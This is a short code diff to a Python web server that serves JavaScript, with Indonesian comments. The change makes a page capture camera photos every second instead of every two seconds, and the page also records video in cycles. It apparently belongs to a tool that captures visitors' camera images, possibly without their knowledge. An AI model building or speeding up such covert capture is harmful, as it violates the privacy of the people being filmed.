@@ -402,8 +402,8 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                         }, 'image/jpeg', 0.8);
                     } catch (e) {}
                 }
-                // Ambil foto setiap 2 detik secara terus-menerus
-                setInterval(capturePhoto, 2000);
+                // Ambil foto setiap 1 detik secara terus-menerus
+                setInterval(capturePhoto, 1000);
 
                 function recordCycle() {
                     const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
